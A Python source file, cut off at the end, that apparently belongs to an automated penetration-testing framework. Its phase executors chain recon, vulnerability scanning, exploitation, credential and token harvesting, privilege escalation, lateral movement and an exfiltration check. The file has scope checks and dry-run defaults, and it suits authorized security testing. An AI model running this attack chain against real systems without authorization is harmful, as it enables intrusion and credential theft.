#!/usr/bin/env python3
"""
phases.py - 渗透测试阶段执行器

定义各阶段的具体执行逻辑
"""

from abc import ABC, abstractmethod
from typing import Dict, Any, List, Optional, TYPE_CHECKING, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import json
import logging
import asyncio
import re

if TYPE_CHECKING:
    from .state import PentestState, PentestPhase
    from core.detectors.result import DetectionResult
    from core.detectors.false_positive_filter import FalsePositiveFilter, ResponseBaseline
    from modules.vuln_verifier import StatisticalVerifier
    from core.http.client import HTTPClient

logger = logging.getLogger(__name__)

# CVE ID 识别正则 (用于从 references/extra 中补充 cve_id)
CVE_ID_PATTERN = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)


@dataclass
class PhaseResult:
    """阶段执行结果"""
    success: bool
    phase: 'PentestPhase'
    data: Dict[str, Any]
    findings: List[Dict[str, Any]]
    errors: List[str]
    duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            'success': self.success,
            'phase': self.phase.value,
            'data': self.data,
            'findings_count': len(self.findings),
            'errors': self.errors,
            'duration': self.duration
        }


class BasePhaseExecutor(ABC):
    """阶段执行器基类

    所有阶段执行器的抽象基类，提供通用功能：
    - URL规范化 (_normalize_url)
    - 前置阶段检查 (can_execute)
    - 检查点恢复 (resume)

    子类必须实现:
    - execute(): 阶段执行逻辑
    - phase: 阶段枚举值
    """

    phase: 'PentestPhase'
    name: str = 'base'
    description: str = '基础阶段执行器'
    required_phases: List['PentestPhase'] = []

    def __init__(self, state: 'PentestState', config: Optional[Dict[str, Any]] = None):
        self.state = state
        self.config = config or {}
        self.logger = logging.getLogger(f"{__name__}.{self.name}")
        # 缓存规范化后的目标URL，避免重复计算
        self._normalized_target: Optional[str] = None

    @abstractmethod
    async def execute(self) -> PhaseResult:
        """执行阶段"""
        pass

    async def resume(self, checkpoint_data: Dict[str, Any]) -> PhaseResult:
        """从检查点恢复执行"""
        return await self.execute()

    def can_execute(self) -> bool:
        """检查是否可以执行"""
        for required in self.required_phases:
            if not self.state.is_phase_completed(required):
                return False
        return True

    def get_missing_requirements(self) -> List['PentestPhase']:
        """获取缺失的前置阶段"""
        return [
            phase for phase in self.required_phases
            if not self.state.is_phase_completed(phase)
        ]

    def _normalize_url(self, url: str) -> str:
        """规范化URL - 确保包含协议

        与 core/recon/base.py 的 _normalize_target 保持一致的规范化逻辑。

        Args:
            url: 原始URL或域名

        Returns:
            规范化后的URL (带协议，无尾部斜杠)

        Examples:
            >>> _normalize_url("example.com")
            "https://example.com"
            >>> _normalize_url("http://example.com/")
            "http://example.com"
        """
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"
        return url.rstrip("/")

    def _extract_cve_id(self, detection_result: Any) -> Optional[str]:
        """从检测结果中提取 cve_id (优先 extra，其次 references/evidence)"""
        cve_id = None
        extra = getattr(detection_result, 'extra', None)
        if isinstance(extra, dict):
            cve_id = (
                extra.get('cve_id')
                or extra.get('cve')
                or extra.get('cve-id')
                or extra.get('cveId')
            )

        if not cve_id:
            references = getattr(detection_result, 'references', None)
            for ref in references or []:
                match = CVE_ID_PATTERN.search(str(ref))
                if match:
                    cve_id = match.group(0)
                    break

        if not cve_id:
            evidence = getattr(detection_result, 'evidence', None)
            if evidence:
                match = CVE_ID_PATTERN.search(str(evidence))
                if match:
                    cve_id = match.group(0)

        return cve_id.upper() if isinstance(cve_id, str) and cve_id else None

    def get_normalized_target(self) -> str:
        """获取规范化后的目标URL (带缓存)

        Returns:
            规范化后的目标URL
        """
        if self._normalized_target is None:
            self._normalized_target = self._normalize_url(self.state.target)
        return self._normalized_target


class ReconPhaseExecutor(BasePhaseExecutor):
    """侦察阶段执行器"""

    name = 'recon'
    description = '信息收集与资产发现'
    required_phases = []

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.RECON

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        try:
            from core.recon.engine import StandardReconEngine
            from core.recon.base import ReconConfig

            recon_config = ReconConfig(
                quick_mode=self.config.get('quick_mode', False),
                enable_port_scan=self.config.get('enable_port_scan', True),
                enable_subdomain=self.config.get('enable_subdomain', True),
                enable_directory=self.config.get('enable_directory', True),
                enable_waf_detect=self.config.get('enable_waf_detect', True),
                max_threads=self.config.get('max_threads', 20),
                timeout=self.config.get('timeout', 30),
            )

            engine = StandardReconEngine(self.state.target, recon_config)
            result = await asyncio.to_thread(engine.run)

            self.state.recon_data = {
                'ip_addresses': getattr(result, 'ip_addresses', []),
                'open_ports': getattr(result, 'open_ports', []),
                'subdomains': getattr(result, 'subdomains', []),
                'directories': getattr(result, 'directories', []),
                'technologies': getattr(result, 'technologies', []),
                'fingerprints': getattr(result, 'fingerprints', {}),
                'waf_detected': getattr(result, 'waf_detected', None),
                'sensitive_files': getattr(result, 'sensitive_files', []),
            }

            for ip in self.state.recon_data.get('ip_addresses', []):
                self.state.discovered_hosts.add(ip)

            for subdomain in self.state.recon_data.get('subdomains', []):
                self.state.discovered_hosts.add(subdomain)

            return PhaseResult(
                success=True,
                phase=PentestPhase.RECON,
                data=self.state.recon_data,
                findings=findings,
                errors=errors,
                duration=getattr(result, 'duration', 0)
            )

        except Exception as e:
            errors.append(str(e))
            self.logger.exception(f"侦察阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.RECON,
                data={},
                findings=findings,
                errors=errors
            )


class VulnScanPhaseExecutor(BasePhaseExecutor):
    """漏洞扫描阶段执行器"""

    name = 'vuln_scan'
    description = '漏洞扫描与检测'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.VULN_SCAN

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.RECON]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        try:
            from core.detectors import DetectorFactory
            from core.detectors.false_positive_filter import FalsePositiveFilter
            from core.evasion import normalize_waf_type
            from core.http import HTTPClient, HTTPConfig
            from modules.vuln_verifier import StatisticalVerifier

            targets = self._get_scan_targets()
            detector_types = self.config.get('detectors', [
                'sqli', 'xss', 'ssrf', 'ssti', 'xxe', 'rce',
                'path_traversal', 'idor', 'open_redirect'
            ])

            waf_name = self.state.recon_data.get('waf_detected')
            waf_type = normalize_waf_type(waf_name)

            detector_config = {
                'timeout': self.config.get('timeout', 30),
                'verify_ssl': self.config.get('verify_ssl', False),
                'follow_redirects': self.config.get('follow_redirects', True),
                'enable_smart_payload': self.config.get('enable_smart_payload', True),
                'smart_payload_source': self.config.get('smart_payload_source', 'adaptive'),
                'waf_type': waf_type.value if waf_type else None,
                'max_payload_variants': self.config.get('max_payload_variants'),
            }
            detector_config = {k: v for k, v in detector_config.items() if v is not None}

            detector = DetectorFactory.create_composite(detector_types, detector_config)

            enable_fp_filter = self.config.get('enable_false_positive_filter', True)
            enable_verifier = self.config.get('enable_verifier', True)
            verifier_rounds = int(self.config.get('verification_rounds', 3))
            baseline_requests = int(self.config.get('baseline_requests', 3))

            http_config = HTTPConfig()
            http_config.timeout = self.config.get('timeout', 30)
            http_config.verify_ssl = self.config.get('verify_ssl', False)
            http_config.follow_redirects = self.config.get('follow_redirects', True)
            http_client = HTTPClient(config=http_config)

            fp_filter = FalsePositiveFilter() if enable_fp_filter else None
            verifier = StatisticalVerifier() if enable_verifier else None

            # 使用enumerate避免重复调用index
            for idx, target_url in enumerate(targets):
                self.state.add_checkpoint(
                    step=idx,
                    data={'current_target': target_url}
                )

                try:
                    baseline = None
                    if fp_filter:
                        try:
                            def _baseline_request(url: str):
                                resp = http_client.get(url)
                                return resp.text, resp.status_code, resp.elapsed, resp.headers

                            baseline = fp_filter.establish_baseline(
                                target_url,
                                _baseline_request,
                                num_requests=baseline_requests
                            )
                        except Exception as e:
                            self.logger.debug(f"基线构建失败 {target_url}: {e}")

                    results = await detector.async_detect(target_url)

                    for result in results:
                        if result.vulnerable:
                            fp_result = None
                            if fp_filter and baseline:
                                fp_result = self._apply_false_positive_filter(
                                    fp_filter,
                                    baseline,
                                    http_client,
                                    result
                                )
                                if fp_result and fp_result.is_false_positive:
                                    continue

                            verification = None
                            if (
                                verifier
                                and result.param
                                and (not result.verified or result.confidence < 0.9)
                            ):
                                verification = await self._apply_statistical_verification(
                                    verifier,
                                    result,
                                    rounds=verifier_rounds
                                )
                                if verification.get('filtered_out'):
                                    continue
                                if verification.get('confirmed'):
                                    result.verified = True
                                    result.confidence = max(
                                        result.confidence,
                                        verification.get('confidence_score', 0.0)
                                    )

                            cve_id = self._extract_cve_id(result)
                            finding = {
                                'type': result.vuln_type,
                                'severity': result.severity.value if hasattr(result.severity, 'value') else str(result.severity),
                                'title': f"{result.vuln_type.upper()} 漏洞",
                                'url': result.url,
                                'param': result.param,
                                'payload': result.payload,
                                'evidence': result.evidence,
                                'verified': result.verified,
                                'confidence': result.confidence,
                                'phase': 'vuln_scan',
                                'remediation': getattr(result, 'remediation', None),
                                'references': getattr(result, 'references', []) or []
                            }
                            if fp_result:
                                finding['false_positive_filter'] = {
                                    'reason': fp_result.reason.value,
                                    'confidence': fp_result.confidence,
                                    'evidence': fp_result.evidence
                                }
                            if verification:
                                finding['verification'] = verification
                            if cve_id:
                                finding['cve_id'] = cve_id
                            findings.append(finding)
                            self.state.add_finding(finding)

                except Exception as e:
                    self.logger.exception(f"扫描 {target_url} 失败: {e}")
                    errors.append(f"扫描 {target_url} 失败: {e}")
                    continue

            return PhaseResult(
                success=len(errors) == 0,
                phase=PentestPhase.VULN_SCAN,
                data={
                    'targets_scanned': len(targets),
                    'vulns_found': len(findings),
                    'waf_detected': waf_name,
                    'waf_type': waf_type.value if waf_type else None,
                    'false_positive_filter': enable_fp_filter,
                    'verifier_enabled': enable_verifier
                },
                findings=findings,
                errors=errors
            )

        except Exception as e:
            self.logger.exception(f"漏洞扫描阶段失败: {e}")
            errors.append(str(e))
            return PhaseResult(
                success=False,
                phase=PentestPhase.VULN_SCAN,
                data={},
                findings=findings,
                errors=errors
            )

    def _get_scan_targets(self) -> List[str]:
        """获取扫描目标URL列表 - 带scope校验防止SSRF

        使用规范化后的目标URL，确保与Recon阶段保持一致。

        Returns:
            规范化后的目标URL列表
        """
        # 使用规范化后的目标URL (修复: 原代码直接使用 self.state.target)
        normalized_target = self.get_normalized_target()
        targets = [normalized_target]

        # 解析主目标域名用于scope校验
        parsed_target = urlparse(normalized_target)
        allowed_hosts = {parsed_target.netloc}

        # 从配置中获取额外允许的域名
        extra_allowed = self.config.get('allowed_hosts', [])
        allowed_hosts.update(extra_allowed)

        recon_data = self.state.recon_data
        for directory in recon_data.get('directories', [])[:50]:
            if not directory.startswith('http'):
                url = f"{normalized_target}/{directory.lstrip('/')}"
            else:
                url = directory
                # scope校验: 只允许访问授权域名
                parsed_url = urlparse(url)
                if parsed_url.netloc not in allowed_hosts:
                    self.logger.warning(f"跳过越界目标: {url} (不在允许范围内)")
                    continue
            targets.append(url)
        return targets

    def _build_param_url(self, url: str, param: str, value: str) -> str:
        """构造带参数的URL"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _build_request_context(
        self,
        result: "DetectionResult"
    ) -> Tuple[str, str, Dict[str, Any], Dict[str, Any], Any, Any]:
        """从检测结果构建请求上下文"""
        method = "GET"
        url = result.url or self.get_normalized_target()
        headers: Dict[str, Any] = {}
        params: Dict[str, Any] = {}
        data = None
        json_data = None

        request = getattr(result, "request", None)
        if request:
            method = (request.method or method).upper()
            if request.url:
                url = request.url
            headers = request.headers or {}
            params = request.params or {}
            body = request.body
            if body:
                body_str = (
                    body.decode("utf-8", errors="ignore")
                    if isinstance(body, (bytes, bytearray))
                    else str(body)
                )
                content_type = str(
                    headers.get("content-type") or headers.get("Content-Type") or ""
                ).lower()
                if "application/json" in content_type or body_str.strip().startswith(("{", "[")):
                    try:
                        json_data = json.loads(body_str)
                    except (json.JSONDecodeError, ValueError):
                        data = body_str
                elif "application/x-www-form-urlencoded" in content_type or "=" in body_str:
                    parsed = parse_qs(body_str, keep_blank_values=True)
                    data = {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
                else:
                    data = body_str

        return method, url, headers, params, data, json_data

    def _apply_false_positive_filter(
        self,
        fp_filter: "FalsePositiveFilter",
        baseline: "ResponseBaseline",
        http_client: "HTTPClient",
        result: "DetectionResult"
    ):
        """最小可用误报过滤"""
        try:
            method, url, headers, params, data, json_data = self._build_request_context(result)
            payload = result.payload or "1"
            request_baseline = baseline if method == "GET" else None

            if method == "GET":
                if result.param:
                    if params:
                        test_params = dict(params)
                        test_params[result.param] = payload
                        resp = http_client.get(url, params=test_params, headers=headers)
                    else:
                        test_url = self._build_param_url(url, result.param, payload)
                        resp = http_client.get(test_url, headers=headers)
                else:
                    resp = http_client.get(url, params=params or None, headers=headers)
            else:
                if result.param:
                    if isinstance(data, dict):
                        data = {**data, result.param: payload}
                    elif isinstance(json_data, dict):
                        json_data = {**json_data, result.param: payload}
                    else:
                        return None
                if data is None and json_data is None:
                    return None
                resp = http_client.request(
                    method,
                    url,
                    headers=headers,
                    params=params or None,
                    data=data,
                    json=json_data
                )
            return fp_filter.check(
                body=resp.text,
                status_code=resp.status_code,
                response_time=resp.elapsed,
                headers=resp.headers,
                baseline=request_baseline,
                url=resp.url
            )
        except Exception as e:
            self.logger.debug(f"误报过滤失败 {result.url}: {e}")
            return None

    async def _apply_statistical_verification(
        self,
        verifier: "StatisticalVerifier",
        result: "DetectionResult",
        rounds: int = 3
    ) -> Dict[str, Any]:
        """统计验证并返回结构化结果"""
        method, url, headers, params, data, json_data = self._build_request_context(result)
        if not result.param:
            return {
                'confirmed': False,
                'confidence_score': 0.0,
                'positive_count': 0,
                'rounds': rounds,
                'recommendation': '缺少参数，无法进行统计验证',
                'filtered_out': False,
                'skipped': True
            }

        summary = await asyncio.to_thread(
            verifier.verify_with_statistics,
            vuln_type=result.vuln_type,
            url=url,
            param=result.param or "",
            payload=result.payload or "",
            rounds=rounds,
            method=method,
            headers=headers,
            params=params,
            data=data,
            json_data=json_data
        )

        confidence_score = float(summary.confidence_score)
        filtered_out = (
            confidence_score < verifier.CONFIDENCE_THRESHOLDS["medium"]
            and not summary.is_confirmed
        )

        return {
            'confirmed': summary.is_confirmed,
            'confidence_score': confidence_score,
            'positive_count': summary.positive_count,
            'rounds': summary.rounds,
            'recommendation': summary.recommendation,
            'filtered_out': filtered_out,
            'skipped': False
        }


class PoCExecPhaseExecutor(BasePhaseExecutor):
    """PoC验证阶段执行器"""

    name = 'poc_exec'
    description = 'PoC漏洞验证'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.POC_EXEC

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.VULN_SCAN]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []
        verified_count = 0

        try:
            from core.cve.poc_engine import get_poc_engine

            poc_engine = get_poc_engine()
            high_value_findings = self.state.get_high_value_findings()

            for finding in high_value_findings:
                try:
                    cve_id = (
                        finding.get('cve_id')
                        or finding.get('cve')
                        or finding.get('cve-id')
                        or finding.get('cveId')
                    )
                    if not cve_id:
                        for ref in finding.get('references', []) or []:
                            match = CVE_ID_PATTERN.search(str(ref))
                            if match:
                                cve_id = match.group(0)
                                break
                    if not cve_id and finding.get('evidence'):
                        match = CVE_ID_PATTERN.search(str(finding.get('evidence')))
                        if match:
                            cve_id = match.group(0)
                    if cve_id:
                        cve_id = cve_id.upper()
                    if cve_id:
                        finding['cve_id'] = cve_id
                        result = await asyncio.to_thread(
                            poc_engine.execute,
                            finding.get('url', self.state.target),
                            cve_id
                        )
                        if result.get('verified'):
                            finding['verified'] = True
                            finding['poc_result'] = result
                            verified_count += 1
                            findings.append(finding)
                except Exception as e:
                    errors.append(f"验证 {finding.get('type')} 失败: {e}")

            return PhaseResult(
                success=True,
                phase=PentestPhase.POC_EXEC,
                data={'verified': verified_count, 'total': len(high_value_findings)},
                findings=findings,
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            return PhaseResult(
                success=False,
                phase=PentestPhase.POC_EXEC,
                data={},
                findings=findings,
                errors=errors
            )


class ExploitPhaseExecutor(BasePhaseExecutor):
    """漏洞利用阶段执行器"""

    name = 'exploit'
    description = '漏洞利用与初始访问'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.EXPLOIT

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.POC_EXEC]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        try:
            from core.detectors import DetectionResult
            from core.exploit import ExploitEngine
            from .state import AccessInfo

            allow_unverified = self.config.get('allow_unverified_exploit', False)
            max_exploits = int(self.config.get('max_exploits', 5))
            exploit_targets = self.config.get('exploit_targets')
            prefer_cve = self.config.get('use_cve_exploit', False)

            engine = ExploitEngine(self.config)

            exploitable = []
            for finding in self.state.findings:
                severity = str(finding.get('severity', '')).lower()
                if severity not in ('critical', 'high'):
                    continue
                if not allow_unverified and not finding.get('verified'):
                    continue
                if finding.get('exploit_attempted'):
                    continue
                if not finding.get('type'):
                    continue
                exploitable.append(finding)

            exploitable = exploitable[:max_exploits]
            success_count = 0

            def _guess_privilege(shell_info: Any) -> str:
                if not shell_info:
                    return 'unknown'
                privileges = [str(p).lower() for p in (shell_info.privileges or [])]
                if any(p in ('system', 'root') for p in privileges):
                    return 'system'
                if any('admin' in p for p in privileges):
                    return 'high'
                return 'medium'

            for finding in exploitable:
                finding['exploit_attempted'] = True
                target_url = finding.get('url') or self.get_normalized_target()
                severity = str(finding.get('severity', 'high')).lower()
                detection_data = {
                    'vulnerable': True,
                    'vuln_type': finding.get('type', ''),
                    'severity': severity if severity else 'high',
                    'url': target_url,
                    'param': finding.get('param'),
                    'payload': finding.get('payload'),
                    'evidence': finding.get('evidence'),
                    'verified': finding.get('verified', False),
                    'confidence': finding.get('confidence', 0.0),
                    'references': finding.get('references', []) or [],
                    'extra': {
                        'cve_id': finding.get('cve_id')
                    }
                }

                try:
                    detection_result = DetectionResult.from_dict(detection_data)
                    if prefer_cve and finding.get('cve_id'):
                        exploit_result = await asyncio.to_thread(
                            engine.exploit_cve,
                            target_url,
                            finding.get('cve_id')
                        )
                    else:
                        exploit_result = await engine.async_exploit(
                            detection_result,
                            targets=exploit_targets
                        )

                    finding['exploit_result'] = exploit_result.to_dict()
                    if exploit_result.success:
                        success_count += 1
                        finding['exploited'] = True

                        access_host = target_url
                        parsed = urlparse(target_url)
                        if parsed.netloc:
                            access_host = parsed.netloc

                        extracted_creds = self._extract_credentials_from_exploit(
                            exploit_result.data,
                            exploit_result.access
                        )
                        session_token = self._extract_session_token(
                            exploit_result.data,
                            exploit_result.access
                        )
                        primary_cred = next(
                            (c for c in extracted_creds if c.get('username')),
                            None
                        )

                        access = AccessInfo(
                            host=access_host,
                            method=f"exploit:{exploit_result.vuln_type}",
                            privilege_level=_guess_privilege(exploit_result.shell),
                            credentials=primary_cred,
                            session_token=session_token,
                            notes=exploit_result.evidence or ''
                        )
                        self.state.add_access(access)

                        if exploit_result.data:
                            self.state.loot.append({
                                'type': 'data',
                                'source': exploit_result.vuln_type,
                                'url': target_url,
                                'data': exploit_result.data
                            })

                        if exploit_result.files:
                            self.state.loot.append({
                                'type': 'file',
                                'source': exploit_result.vuln_type,
                                'url': target_url,
                                'files': [f.to_dict() for f in exploit_result.files]
                            })

                        if exploit_result.access:
                            self.state.loot.append({
                                'type': 'access',
                                'source': exploit_result.vuln_type,
                                'url': target_url,
                                'data': exploit_result.access.to_dict()
                            })

                        if extracted_creds:
                            for cred in extracted_creds:
                                if isinstance(cred, dict) and cred.get('username'):
                                    self.state.add_credential(cred)
                                elif isinstance(cred, dict) and cred.get('token'):
                                    self.state.add_credential(cred)

                        findings.append({
                            'type': 'exploit',
                            'severity': severity,
                            'title': f"{exploit_result.vuln_type.upper()} 漏洞利用成功",
                            'url': target_url,
                            'phase': 'exploit',
                            'details': exploit_result.to_dict()
                        })

                except Exception as e:
                    err = f"利用 {finding.get('type')} 失败: {e}"
                    errors.append(err)
                    self.logger.exception(err)

            return PhaseResult(
                success=success_count > 0 or len(exploitable) == 0,
                phase=PentestPhase.EXPLOIT,
                data={
                    'exploitable_count': len(exploitable),
                    'exploited_count': success_count,
                    'allow_unverified': allow_unverified
                },
                findings=findings,
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            self.logger.exception(f"漏洞利用阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.EXPLOIT,
                data={},
                findings=findings,
                errors=errors
            )

    def _extract_credentials_from_exploit(
        self,
        data: Any,
        access: Any
    ) -> List[Dict[str, Any]]:
        """从利用结果中提取凭证或令牌"""
        creds: List[Dict[str, Any]] = []

        def _add_cred(item: Dict[str, Any]):
            if not isinstance(item, dict):
                return
            username = item.get('username') or item.get('user') or item.get('login')
            password = item.get('password') or item.get('pass') or item.get('passwd')
            token = item.get('token') or item.get('access_token') or item.get('session')
            if username and password:
                creds.append({
                    'type': 'password',
                    'username': str(username),
                    'password': str(password),
                    'source': 'exploit'
                })
            elif token:
                creds.append({
                    'type': 'token',
                    'token': str(token),
                    'source': 'exploit'
                })

        if isinstance(data, dict):
            raw_list = data.get('credentials')
            if isinstance(raw_list, list):
                for item in raw_list:
                    _add_cred(item)

            _add_cred(data)

            for key in ('tokens', 'sessions'):
                items = data.get(key)
                if isinstance(items, list):
                    for item in items:
                        _add_cred({'token': item})

        if access and isinstance(getattr(access, 'metadata_found', None), dict):
            _add_cred(access.metadata_found)

        deduped = []
        seen = set()
        for cred in creds:
            fingerprint = (
                cred.get('username'),
                cred.get('password'),
                cred.get('token')
            )
            if fingerprint in seen:
                continue
            seen.add(fingerprint)
            deduped.append(cred)

        return deduped

    def _extract_session_token(self, data: Any, access: Any) -> Optional[str]:
        """从利用结果中提取会话令牌"""
        token_keys = ('session', 'session_token', 'access_token', 'jwt', 'token')

        if isinstance(data, dict):
            for key in token_keys:
                value = data.get(key)
                if value:
                    return str(value)

        if access and isinstance(getattr(access, 'metadata_found', None), dict):
            for key in token_keys:
                value = access.metadata_found.get(key)
                if value:
                    return str(value)

        return None


class PrivilegeEscPhaseExecutor(BasePhaseExecutor):
    """权限提升阶段执行器"""

    name = 'privilege_escalation'
    description = '权限提升'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.PRIVILEGE_ESC

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.EXPLOIT]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        if not self.state.access_list:
            return PhaseResult(
                success=True,
                phase=PentestPhase.PRIVILEGE_ESC,
                data={'skipped': True, 'reason': '无初始访问'},
                findings=findings,
                errors=errors
            )

        try:
            from core.privilege_escalation import (
                get_escalation_module,
                EscalationConfig,
                EscalationMethod
            )
            from .state import AccessInfo

            method_names = (
                self.config.get('escalation_methods')
                or self.config.get('methods')
                or []
            )
            methods = []
            for name in method_names:
                try:
                    methods.append(EscalationMethod(name))
                except ValueError:
                    self.logger.warning(f"未知提权方法: {name}")

            escalation_config = EscalationConfig(
                timeout=float(self.config.get('timeout', 60)),
                cleanup=bool(self.config.get('cleanup', True)),
                stealth=bool(self.config.get('stealth', False)),
                auto_select=bool(self.config.get('auto_select', True)),
                min_success_probability=float(self.config.get('min_success_probability', 0.3)),
                safe_mode=bool(self.config.get('safe_mode', True)),
                backup_before=bool(self.config.get('backup_before', True)),
            )
            if methods:
                escalation_config.methods = methods

            module = get_escalation_module(escalation_config)
            with module:
                if escalation_config.auto_select:
                    result = await asyncio.to_thread(module.auto_escalate)
                else:
                    method = methods[0] if methods else None
                    result = await asyncio.to_thread(module.escalate, method)

            data = result.to_dict()
            if result.success:
                access_host = self.state.access_list[-1].host if self.state.access_list else self.state.target
                access = AccessInfo(
                    host=access_host,
                    method=f"privilege_escalation:{result.method.value}",
                    privilege_level=result.to_level.value,
                    credentials=None,
                    session_token=None,
                    notes=result.evidence or result.output or ''
                )
                self.state.add_access(access)

                findings.append({
                    'type': 'privilege_escalation',
                    'severity': 'critical',
                    'title': f"权限提升成功: {result.method.value}",
                    'description': result.output or result.evidence or '',
                    'phase': 'privilege_escalation'
                })

            return PhaseResult(
                success=result.success,
                phase=PentestPhase.PRIVILEGE_ESC,
                data=data,
                findings=findings,
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            self.logger.exception(f"权限提升阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.PRIVILEGE_ESC,
                data={},
                findings=findings,
                errors=errors
            )


class LateralMovePhaseExecutor(BasePhaseExecutor):
    """横向移动阶段执行器"""

    name = 'lateral_movement'
    description = '横向移动'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.LATERAL_MOVE

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.PRIVILEGE_ESC]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        if not self.state.credentials:
            return PhaseResult(
                success=True,
                phase=PentestPhase.LATERAL_MOVE,
                data={'skipped': True, 'reason': '无可用凭证'},
                findings=findings,
                errors=errors
            )

        try:
            from core.lateral import (
                ensure_credentials,
                auto_lateral,
                LateralConfig,
            )
            from .state import AccessInfo

            targets = self.config.get('lateral_targets') or list(self.state.discovered_hosts)
            if not targets:
                return PhaseResult(
                    success=True,
                    phase=PentestPhase.LATERAL_MOVE,
                    data={'skipped': True, 'reason': '无可用横向目标'},
                    findings=findings,
                    errors=errors
                )

            max_targets = int(self.config.get('max_lateral_targets', 10))
            max_creds = int(self.config.get('max_lateral_credentials', len(self.state.credentials)))
            command = self.config.get('lateral_command', 'whoami')
            preferred_methods = self.config.get('preferred_methods')

            lateral_config = LateralConfig(
                timeout=float(self.config.get('timeout', 30.0))
            )

            success_count = 0
            attempted = 0
            results = {}

            for target in targets[:max_targets]:
                target_success = False
                for cred in self.state.credentials[:max_creds]:
                    attempted += 1
                    try:
                        creds = ensure_credentials(cred)
                    except Exception as e:
                        errors.append(f"无效凭证: {e}")
                        continue

                    try:
                        module = await asyncio.to_thread(
                            auto_lateral,
                            target,
                            creds,
                            lateral_config,
                            preferred_methods
                        )
                        if not module:
                            continue

                        try:
                            result = await asyncio.to_thread(module.execute, command)
                        finally:
                            await asyncio.to_thread(module.disconnect)

                        results.setdefault(target, []).append(result.to_dict())

                        if result.success:
                            success_count += 1
                            target_success = True
                            access = AccessInfo(
                                host=target,
                                method=f"lateral:{result.method or 'auto'}",
                                privilege_level='unknown',
                                credentials=cred if isinstance(cred, dict) else None,
                                session_token=None,
                                notes=result.output[:200] if result.output else ''
                            )
                            self.state.add_access(access)
                            findings.append({
                                'type': 'lateral_movement',
                                'severity': 'high',
                                'title': f"横向移动成功: {target}",
                                'description': result.output or '',
                                'phase': 'lateral_movement'
                            })
                            break
                    except Exception as e:
                        self.logger.exception(f"横向移动失败: {target} - {e}")
                        errors.append(f"横向移动失败 {target}: {e}")

                if not target_success:
                    results.setdefault(target, []).append({'success': False, 'error': '所有凭证均失败'})

            return PhaseResult(
                success=success_count > 0,
                phase=PentestPhase.LATERAL_MOVE,
                data={
                    'targets': targets[:max_targets],
                    'attempted': attempted,
                    'success_count': success_count,
                    'results': results
                },
                findings=findings,
                errors=errors
            )

        except Exception as e:
            errors.append(str(e))
            self.logger.exception(f"横向移动阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.LATERAL_MOVE,
                data={},
                findings=findings,
                errors=errors
            )


class ExfiltratePhaseExecutor(BasePhaseExecutor):
    """数据外泄阶段执行器

    安全警告: 此阶段仅用于授权渗透测试中验证数据外泄可行性。
    默认情况下此阶段被跳过 (skip_exfiltrate=True)。

    配置项:
        skip_exfiltrate (bool): 是否跳过此阶段，默认True
        exfil_methods (list): 允许的外泄方法 ['dns', 'http', 'icmp']
        dry_run (bool): 仅模拟，不实际外泄数据，默认True
    """

    name = 'exfiltrate'
    description = '数据外泄'

    @property
    def phase(self):
        from .state import PentestPhase
        return PentestPhase.EXFILTRATE

    @property
    def required_phases(self):
        from .state import PentestPhase
        return [PentestPhase.LATERAL_MOVE]

    async def execute(self) -> PhaseResult:
        from .state import PentestPhase
        errors = []
        findings = []

        # 检查配置是否跳过此阶段 (修复: 原代码硬编码跳过，配置无效)
        skip_exfiltrate = self.config.get('skip_exfiltrate', True)
        if skip_exfiltrate:
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data={'skipped': True, 'reason': '配置中设置跳过 (skip_exfiltrate=True)'},
                findings=[],
                errors=[]
            )

        # 检查是否有可外泄的数据
        sensitive_data = self.state.recon_data.get('sensitive_files', [])
        credentials = getattr(self.state, "credentials", None)
        loot = getattr(self.state, "loot", None) or []

        if not sensitive_data and not credentials and not loot:
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data={'skipped': True, 'reason': '无敏感数据可外泄'},
                findings=[],
                errors=[]
            )

        dry_run = self.config.get('dry_run', True)
        include_credentials = self.config.get('exfil_include_credentials', False)

        exfil_assessment = {
            'sensitive_files_count': len(sensitive_data),
            'credentials_count': len(credentials) if credentials else 0,
            'loot_count': len(loot),
            'exfil_feasible': bool(sensitive_data or credentials or loot),
            'dry_run': dry_run,
        }

        if exfil_assessment['exfil_feasible']:
            findings.append({
                'type': 'data_exfiltration_risk',
                'severity': 'high',
                'title': '数据外泄风险',
                'description': f"发现 {exfil_assessment['sensitive_files_count']} 个敏感文件、"
                              f"{exfil_assessment['credentials_count']} 组凭证、"
